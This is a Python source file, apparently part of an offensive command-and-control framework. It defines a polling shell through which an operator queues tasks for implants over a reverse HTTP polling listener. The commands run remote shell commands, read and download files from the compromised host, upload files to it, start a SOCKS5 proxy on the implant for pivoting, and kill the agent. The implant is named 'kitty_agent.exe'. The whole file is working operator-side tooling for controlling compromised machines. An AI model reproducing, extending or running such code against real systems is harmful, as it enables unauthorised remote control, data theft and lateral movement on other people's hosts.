#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Generic shell for listener-backed polling transports."""

import shlex
import time
from typing import Any, Dict, List, Optional

from .base_shell import BaseShell


class PollingShell(BaseShell):
    """Queue commands through a listener and read buffered output."""

    def __init__(self, session_id: str, session_type: str = "polling", framework=None):
        super().__init__(session_id, session_type)
        self.framework = framework
        self.listener = None
        self.transport = session_type or "polling"
        self.client_id = ""
        self.client_ip = ""
        self._initialize_listener()

    def _listener_is_live(self, listener) -> bool:
        """True if this object is the running HTTP polling listener (not a stale module copy)."""
        if listener is None:
            return False
        # Prefer the instance registered in active_listeners
        active = getattr(self.framework, "active_listeners", None) or {}
        for live in active.values():
            if live is listener:
                return True
        # Fallback: must still be serving
        if getattr(listener, "running", False) and getattr(listener, "httpd", None):
            return True
        return False

    def _initialize_listener(self):
        """(Re)bind to the live reverse_http_polling listener for this session."""
        self.listener = None
        if not self.framework or not hasattr(self.framework, "session_manager"):
            return
        session = self.framework.session_manager.get_session(self.session_id)
        if not session:
            return
        data = session.data if isinstance(session.data, dict) else {}
        self.transport = data.get("protocol", session.session_type) or session.session_type
        self.client_id = (
            data.get("client_id")
            or data.get("implant_id")
            or self.client_id
            or ""
        )
        self.client_ip = data.get("client_ip", session.host) if data else session.host

        active = getattr(self.framework, "active_listeners", None) or {}
        listener_id = data.get("listener_id")
        if listener_id and listener_id in active:
            cand = active[listener_id]
            if hasattr(cand, "set_pending_command") and hasattr(cand, "get_output_lines"):
                self.listener = cand
                return

        # Match by session map on live listeners only (never framework.modules templates)
        for listener in active.values():
            if not hasattr(listener, "set_pending_command"):
                continue
            if not hasattr(listener, "get_output_lines"):
                continue
            session_map = getattr(listener, "_session_to_client_id", {}) or {}
            client_map = getattr(listener, "_client_id_to_session", {}) or {}
            if self.session_id in session_map:
                self.listener = listener
                return
            if self.client_id and client_map.get(self.client_id) == self.session_id:
                self.listener = listener
                return

        # Last resort: any live polling listener that knows this implant id
        if self.client_id:
            for listener in active.values():
                client_map = getattr(listener, "_client_id_to_session", {}) or {}
                if self.client_id in client_map and hasattr(listener, "set_pending_task"):
                    # Rebind session id to whatever the listener currently uses
                    sid = client_map[self.client_id]
                    if sid and sid != self.session_id:
                        # Keep shell session_id; queue using listener's sid via alias below
                        pass
                    self.listener = listener
                    return

    def rebind_listener(self) -> bool:
        """Force refresh of listener binding (call on interact / before each task)."""
        self._initialize_listener()
        return self._listener_is_live(self.listener)

    @property
    def shell_name(self) -> str:
        return "polling"

    @property
    def prompt_template(self) -> str:
        label = self.client_id or self.session_id[:8]
        return f"{self.transport} [{label}]> "

    def get_prompt(self) -> str:
        return self.prompt_template

    def get_available_commands(self) -> List[str]:
        return [
            "help",
            "info",
            "run",
            "cmd",
            "shell",
            "queue",
            "pwd",
            "whoami",
            "ls",
            "cat",
            "download",
            "upload",
            "socks",
            "kill_agent",
            "output",
            "out",
            "clear_output",
            "exit",
            "quit",
            "disconnect",
        ]

    def execute_command(self, command: str) -> Dict[str, Any]:
        if not command.strip():
            return {"output": "", "status": 0, "error": ""}
        self.add_to_history(command)
        parts = command.strip().split(None, 1)
        cmd = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""

        if cmd == "help":
            return {"output": self._help(), "status": 0, "error": ""}
        if cmd == "info":
            return {"output": self._info(), "status": 0, "error": ""}
        if cmd in ("run", "cmd", "shell"):
            return self._queue_shell(args, wait=True)
        if cmd == "queue":
            return self._queue_shell(args, wait=False)
        if cmd in ("pwd", "whoami", "exit", "quit"):
            if cmd in ("exit", "quit") and not args.strip():
                # Prefer local shell exit unless "exit agent"
                if cmd == "exit" and args.strip().lower() in ("agent", "implant"):
                    return self._queue_task("exit", {}, wait=True)
                self.is_active = False
                return {"output": "Bye!", "status": 0, "error": ""}
            if cmd == "whoami":
                return self._queue_task("whoami", {}, wait=True)
            if cmd == "pwd":
                return self._queue_task("pwd", {}, wait=True)
        if cmd == "ls":
            path = args.strip() or "."
            return self._queue_task("ls", {"path": path}, wait=True)
        if cmd == "cat":
            if not args.strip():
                return {"output": "", "status": 1, "error": "Usage: cat <path>"}
            return self._queue_task("cat", {"path": args.strip()}, wait=True)
        if cmd == "download":
            if not args.strip():
                return {"output": "", "status": 1, "error": "Usage: download <remote_path>"}
            return self._queue_task("download", {"path": args.strip()}, wait=True)
        if cmd == "upload":
            return self._upload(args)
        if cmd == "kill_agent":
            return self._queue_task("exit", {}, wait=True)
        if cmd == "socks":
            sub = (args.strip().split(None, 1) + [""])[0].lower()
            rest = args.strip()[len(sub):].strip() if args.strip() else ""
            if sub in ("", "start"):
                port = 1080
                if rest.isdigit():
                    port = int(rest)
                elif sub == "start" and rest.isdigit():
                    port = int(rest)
                # also: socks start 1080
                parts = args.split()
                if len(parts) >= 2 and parts[0].lower() == "start" and parts[1].isdigit():
                    port = int(parts[1])
                elif len(parts) == 1 and parts[0].isdigit():
                    port = int(parts[0])
                return self._queue_task("socks_start", {"port": port}, wait=True)
            if sub == "stop":
                return self._queue_task("socks_stop", {}, wait=True)
            return {
                "output": "",
                "status": 1,
                "error": "Usage: socks start [port] | socks stop",
            }
        if cmd in ("output", "out"):
            return self._output(args)
        if cmd in ("clear_output", "output_clear"):
            return self._clear_output()
        if cmd in ("disconnect",):
            self.is_active = False
            return {"output": "Bye!", "status": 0, "error": ""}

        # Convenience: bare OS command → typed shell task
        return self._queue_shell(command.strip(), wait=True)

    def _help(self) -> str:
        return """Polling Shell Commands:
  <os command>       Run remote shell command (waits for poll result)
  run <command>      Same as above
  queue <command>    Queue only (then use 'output')
  pwd / whoami / ls [path] / cat <path>
  download <path>    Fetch remote file via agent
  upload <local> <remote>   Push file to agent
  socks start [port] Start SOCKS5 on implant (default 1080)
  socks stop         Stop implant SOCKS5
  kill_agent         Tell implant to exit
  output [N]         Show last N output chunks
  clear_output       Clear buffered output
  info               Show transport/session info
  help               This help
  exit / quit        Leave shell (agent keeps polling)

Tip: wait time ≈ agent poll_interval (default ~10s)."""

    def _info(self) -> str:
        self._initialize_listener()
        sid = self._queue_session_id()
        age = self._agent_last_seen_age()
        age_txt = f"{int(age)}s ago" if age is not None else "never / unknown"
        live = "yes" if self._listener_is_live(self.listener) else "NO (stale or missing)"
        lid = getattr(self.listener, "listener_id", None) if self.listener else None
        return "\n".join(
            [
                f"Transport: {self.transport or '(unknown)'}",
                f"Client:    {self.client_id or '(unknown)'}",
                f"IP/Host:   {self.client_ip or '(unknown)'}",
                f"Session:   {self.session_id}",
                f"Queue sid: {sid}",
                f"Listener:  {lid or '(none)'} live={live}",
                f"Last poll: {age_txt}",
                f"Pending:   {self._pending_depth()} task(s)",
            ]
        )

    def _wait_timeout(self) -> float:
        base = 10.0
        if self.listener is not None:
            raw = getattr(self.listener, "poll_interval", None)
            try:
                if hasattr(raw, "value"):
                    base = float(raw.value)
                elif raw is not None:
                    base = float(raw)
            except (TypeError, ValueError):
                base = 10.0
        # Cap so a mis-set poll_interval cannot hang the console for minutes
        return min(120.0, max(20.0, base * 3.0 + 5.0))

    def _queue_session_id(self) -> str:
        """Session id the live listener uses for this implant (may differ after rebind)."""
        if self.listener and self.client_id:
            client_map = getattr(self.listener, "_client_id_to_session", {}) or {}
            sid = client_map.get(self.client_id)
            if sid:
                return str(sid)
        return self.session_id

    def _ensure_listener(self) -> Optional[str]:
        # Always rebind: listener UUIDs change across restart; stale refs queue into void
        self._initialize_listener()
        if not self.listener:
            return "Polling listener not available (is it still running in background?)"
        if not self._listener_is_live(self.listener):
            return (
                "Polling listener binding is stale (listener restarted?). "
                "Exit shell, ensure the listener job is running, then sessions interact again."
            )
        return None

    def _snapshot_len(self) -> int:
        if not self.listener or not hasattr(self.listener, "get_output_lines"):
            return 0
        sid = self._queue_session_id()
        return len(self.listener.get_output_lines(sid, last_n=500) or [])

    def _agent_last_seen_age(self) -> Optional[float]:
        if not self.listener:
            return None
        sid = self._queue_session_id()
        last = (getattr(self.listener, "_last_seen", None) or {}).get(sid)
        if last is None:
            return None
        try:
            return max(0.0, time.time() - float(last))
        except (TypeError, ValueError):
            return None

    def _pending_depth(self) -> int:
        if not self.listener:
            return 0
        sid = self._queue_session_id()
        q = (getattr(self.listener, "_pending_commands", None) or {}).get(sid) or []
        return len(q)

    def _wait_for_new_output(self, before_n: int) -> Dict[str, Any]:
        timeout = self._wait_timeout()
        deadline = time.time() + timeout
        sid = self._queue_session_id()
        saw_dequeue = False
        announced = False
        while time.time() < deadline:
            if not announced:
                announced = True
                try:
                    from core.output_handler import print_info

                    print_info(
                        f"Waiting up to {int(timeout)}s for agent poll/result "
                        f"(last poll: "
                        f"{int(self._agent_last_seen_age()) if self._agent_last_seen_age() is not None else '?'}s ago)..."
                    )
                except Exception:
                    pass
            time.sleep(0.4)
            # Listener may have been rebound mid-wait
            if not self._listener_is_live(self.listener):
                self._initialize_listener()
                if not self.listener:
                    return {
                        "output": "",
                        "status": 1,
                        "error": "Listener disappeared while waiting for agent output",
                    }
                sid = self._queue_session_id()
            lines = list(self.listener.get_output_lines(sid, last_n=500) or [])
            if len(lines) > before_n:
                return {"output": "\n".join(lines[before_n:]), "status": 0, "error": ""}
            if self._pending_depth() == 0:
                saw_dequeue = True
            age = self._agent_last_seen_age()
            # Agent gone silent well beyond poll window → fail fast
            if age is not None and age > max(45.0, timeout):
                return {
                    "output": "",
                    "status": 1,
                    "error": (
                        f"Agent not polling (last check-in {int(age)}s ago). "
                        "Is kitty_agent.exe still running and reaching the listener?"
                    ),
                }
        age = self._agent_last_seen_age()
        age_txt = f"{int(age)}s ago" if age is not None else "never"
        hint = (
            "Task was picked up by a poll but no /result arrived — implant may have crashed on exec."
            if saw_dequeue
            else "Task still queued — agent never polled this listener (wrong host/port, dead implant, or stale shell binding)."
        )
        return {
            "output": (
                f"Command queued; no output within {int(timeout)}s.\n"
                f"Agent last poll: {age_txt}. Pending queue: {self._pending_depth()}.\n"
                f"{hint}\n"
                "Try: info | c2log | output"
            ),
            "status": 0,
            "error": "",
        }

    def _queue_task(
        self, command: str, args: Dict[str, Any], *, wait: bool = True
    ) -> Dict[str, Any]:
        err = self._ensure_listener()
        if err:
            return {"output": "", "status": 1, "error": err}
        sid = self._queue_session_id()
        before_n = self._snapshot_len()
        if hasattr(self.listener, "set_pending_task"):
            from lib.c2.task_protocol import AgentTask

            self.listener.set_pending_task(
                sid, AgentTask(command=command, args=dict(args or {}))
            )
        elif hasattr(self.listener, "set_pending_command"):
            # Fallback: encode as shell-ish string
            if command == "shell":
                self.listener.set_pending_command(
                    sid, str((args or {}).get("cmd") or "")
                )
            else:
                self.listener.set_pending_command(
                    sid, f"{command} {args}".strip()
                )
        else:
            return {"output": "", "status": 1, "error": "Listener cannot queue tasks"}
        if not wait:
            return {
                "output": "Task queued. Use 'output' after the next agent poll.",
                "status": 0,
                "error": "",
            }
        return self._wait_for_new_output(before_n)

    def _queue_shell(self, args: str, *, wait: bool = True) -> Dict[str, Any]:
        if not str(args or "").strip():
            return {"output": "", "status": 1, "error": "Usage: run <command>"}
        return self._queue_task("shell", {"cmd": args.strip()}, wait=wait)

    def _upload(self, args: str) -> Dict[str, Any]:
        try:
            parts = shlex.split(args)
        except ValueError:
            parts = args.split()
        if len(parts) < 2:
            return {
                "output": "",
                "status": 1,
                "error": "Usage: upload <local_path> <remote_path>",
            }
        local_path, remote_path = parts[0], parts[1]
        try:
            import base64
            from pathlib import Path

            raw = Path(local_path).expanduser().read_bytes()
        except Exception as exc:
            return {"output": "", "status": 1, "error": f"Cannot read local file: {exc}"}
        b64 = base64.b64encode(raw).decode("ascii")
        return self._queue_task(
            "upload",
            {"path": remote_path, "data": b64, "encoding": "base64"},
            wait=True,
        )

    def _output(self, args: str) -> Dict[str, Any]:
        err = self._ensure_listener()
        if err:
            return {"output": "(no output)", "status": 0, "error": ""}
        if not hasattr(self.listener, "get_output_lines"):
            return {"output": "(no output)", "status": 0, "error": ""}
        n = 50
        if args.strip().isdigit():
            n = min(int(args.strip()), 500)
        lines = self.listener.get_output_lines(self._queue_session_id(), last_n=n)
        return {
            "output": "\n".join(lines) if lines else "(no output from agent yet)",
            "status": 0,
            "error": "",
        }

    def _clear_output(self) -> Dict[str, Any]:
        if self.listener and hasattr(self.listener, "get_output"):
            self.listener.get_output(self._queue_session_id(), clear=True)
        return {"output": "Output cleared", "status": 0, "error": ""}
